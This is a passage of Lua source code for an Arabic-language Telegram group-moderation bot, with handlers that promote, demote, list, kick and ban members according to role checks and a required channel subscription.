if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو ادمن ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو ادمن ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من الادمنية ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن @(.*)$") and Manager(msg) then
local username = text:match("^تنزيل ادمن @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من الادمنية ↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^تنزيل ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:srem(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من الادمنية ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من الادمنيةه ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == 'مسح المنظفين' and BasicConstructor(msg) then
database:del(bot_id..'VVVZVV:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⌔︙تم مسح المنظفيه')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'VVVZVV:MN:TF'..msg.chat_id_)
t = "\n ⌔︙قائمة المنظفين \n•━━━━━━𝑳𝐍━━━━━━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⌔︙لا يوجد المنظفين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنظفين") or text == ("صيح المنظفين") then
local list = database:smembers(bot_id..'VVVZVV:MN:TF'..msg.chat_id_)
t = "\n ⌔︙وينكم تعالو يريدوكم بكروب \n•━━━━━━𝑳𝐍━━━━━━•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ⌔︙لا يوجد منظفيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⌔︙لا تستطيع استخدام البوت \n  ⌔︙يرجى الاشتراك بالقناه اولا \n  ⌔︙اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ⌔︙تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌔︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SourceLarvine')..')'
status  = '\n ⌔︙تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منظف @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⌔︙لا تستطيع استخدام البوت \n  ⌔︙يرجى الاشتراك بالقناه اولا \n  ⌔︙اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ⌔︙تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ⌔︙عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ⌔︙العضو » ['..result.title_..'](t.me/'..(username or 'SourceLarvine')..')'
status  = '\n ⌔︙تم ترقيته منظف'
texts = usertext..status
else
texts = ' ⌔︙لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⌔︙لا تستطيع استخدام البوت \n  ⌔︙يرجى الاشتراك بالقناه اولا \n  ⌔︙اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ⌔︙تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌔︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SourceLarvine')..')'
status  = '\n ⌔︙تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ⌔︙العضو » '..userid..''
status  = '\n ⌔︙تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⌔︙لا تستطيع استخدام البوت \n  ⌔︙يرجى الاشتراك بالقناه اولا \n  ⌔︙اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌔︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SourceLarvine')..')'
status  = '\n ⌔︙تم تنزيله من المنظفيه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منظف @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⌔︙لا تستطيع استخدام البوت \n  ⌔︙يرجى الاشتراك بالقناه اولا \n  ⌔︙اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ⌔︙العضو » ['..result.title_..'](t.me/'..(username or 'SourceLarvine')..')'
status  = '\n ⌔︙تم تنزيله من المنظفيه'
texts = usertext..status
else
texts = ' ⌔︙لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⌔︙لا تستطيع استخدام البوت \n  ⌔︙يرجى الاشتراك بالقناه اولا \n  ⌔︙اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'VVVZVV:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌔︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SourceLarvine')..')'
status  = '\n ⌔︙تم تنزيله من المنظفيه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ⌔︙العضو » '..userid..''
status  = '\n ⌔︙تم تنزيله من المنظفيه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
------------------------------------------------------------------------
if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعطيل الطرد من قبل المنشئين ↝ ܰ') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "܁༯┆ لا تستطيع طرد البوت↝ ܰ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n܁༯┆ عذرا لا استطيع طرد ◃ كتم ◃ تقييد ◃  ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'܁༯┆ليس لدي صلاحية الحظر يرجى تفعيلها ↝ ܰ') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆ البوت ليس ادمن يرجئ ترقيتي ↝ ܰ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆ههلو عمري ↝ ܰ '
 statusk  = '\n܁༯┆تم طرد العضو بنجاح ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..statusk)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^طرد @(.*)$") and Mod(msg) then 
local username = text:match("^طرد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعطيل الطرد من قبل المنشئين ↝ ܰ') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "܁༯┆ لاتستطيع طرد البوت↝ ܰ ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n܁༯┆ عذرا لا استطيع طرد ◃ كتم ◃ تقييد ◃  ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆ عذرا عزيزي هذا معرف قناة ↝ ܰ ")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'܁༯┆ليس لدي صلاحية الحظر يرجى تفعيلها ↝ ܰ') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆ البوت ليس ادمن يرجئ ترقيتي ↝ ܰ') 
return false  
end
usertext = '\n܁༯┆ههلو عمري ↝ ܰ '
 statusk  = '\n܁༯┆تم طرد العضو بنجاح ↝ ܰ'
texts = usertext..statusk
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, '܁༯┆ لايوجد معرف بهذا الحساب ↝ ܰ ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  

if text and text:match("^طرد (%d+)$") and Mod(msg) then 
local userid = text:match("^طرد (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعطيل الطرد من قبل المنشئين ↝ ܰ') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "܁༯┆ لاتستطيع طرد البوت↝ ܰ ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n܁༯┆ عذرا لا استطيع طرد ◃ كتم ◃ تقييد ◃  ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'܁༯┆ليس لدي صلاحية الحظر يرجى تفعيلها ↝ ܰ') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'܁༯┆ البوت ليس ادمن يرجئ ترقيتي ↝ ܰ') 
return false  
end
chat_kick(msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
 usertext = '\n܁༯┆ههلو عمري ↝ ܰ '
 statusk  = '\n܁༯┆تم طرد العضو بنجاح ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..statusk)
else
 usertext = '\n܁༯┆ههلو عمري ↝ ܰ '
 statusk  = '\n܁༯┆تم طرد العضو بنجاح ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..statusk)
end;end,nil)
end,nil)   
end
return false
end
------------------------------------------------------------------------
if text == 'مسح المميزين' and Mod(msg) then
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '܁༯┆ تم مسح قائمة الاعضاء المميزين ↝ ܰ')
end
if text == ("المميزين") and Mod(msg) then
local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
t = "\n٭ 𖤓┆قائمة المميزين ↝↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞ .\n"
else
end
end
if #list == 0 then
t = "܁༯┆لايوجد مميزين ↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعطيل الرفع من قبل المنشئين ↝ ܰ') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
local  statuss  = '\n܁༯┆تم رفع العضو مميز ↝ ܰ '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مميز @(.*)$") and Mod(msg) then
local username = text:match("^رفع مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعطيل الرفع من قبل المنشئين ↝ ܰ') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
local  statuss  = '\n܁༯┆تم رفع العضو مميز ↝ ܰ '
texts = usertext..statuss
else
texts = '܁༯┆لايوجد حساب بهذا المعرف ↝ ܰ' 
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^رفع مميز (%d+)$") and Mod(msg) then
local userid = text:match("^رفع مميز (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعطيل الرفع من قبل المنشئين ↝ ܰ') 
return false
end
database:sadd(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
local  statuss  = '\n܁༯┆تم رفع العضو مميز ↝ ܰ '
send(msg.chat_id_, msg.id_, usertext..statuss)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
local  statuss  = '\n܁༯┆تم رفع العضو مميز ↝ ܰ '
send(msg.chat_id_, msg.id_, usertext..statuss)
end;end,nil)
return false
end

if (text == ("تنزيل مميز")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المميزين ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز @(.*)$") and Mod(msg) then
local username = text:match("^تنزيل مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المميزين ↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز (%d+)$") and Mod(msg) then
local userid = text:match("^تنزيل مميز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:srem(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المميزين ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المميزين ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

------------------------------------------------------------------------
if text == 'مسح المحظورين' and Mod(msg) then
database:del(bot_id..'Ban:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n🚷┇ تم مسح المحظورين')
end
if text == ("المحظورين") then
local list = database:smembers(bot_id..'Ban:User'..msg.chat_id_)
t = "\n📮┇ قائمة محظورين المجموعه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "✖┇ لا يوجد محظورين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("حظر") and msg.reply_to_message_id_ ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⚠️┇ تم تعطيل الحظر من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "⚠┇ لا تسطيع حظر البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⚠┇ عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'⚠┇ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'☑️┇البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Ban:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n👤┇ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'R_IQ9')..')'
status  = '\n📮┇ الايدي » `'..result.sender_user_id_..'`\n☑️┇ تم حظره من المجموعه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text and text:match("^حظر @(.*)$") and Mod(msg) then
local username = text:match("^حظر @(.*)$")
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'☑️┇  تم تعطيل الحظر من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
